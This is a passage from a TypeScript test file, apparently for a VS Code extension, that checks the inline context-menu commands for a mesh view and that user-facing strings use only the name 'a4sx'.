    const inline = pkg.contributes.menus["view/item/context"].filter((m: any) => m.when === "view == a4sx.meshes && viewItem == a4sx.mesh");
    assert.deepStrictEqual(inline.filter((m: any) => m.group.startsWith("inline")).map((m: any) => m.command), [ext.CMD_START_IN_MESH, ext.CMD_OPEN_MESH]);
  });

  it("user-facing strings say a4sx only", () => {
    const text = JSON.stringify(pkg.contributes) + JSON.stringify(MESH_TEXTS);
    assert.ok(!/agent-mdx|amdx|polaris/i.test(text));
  });
});
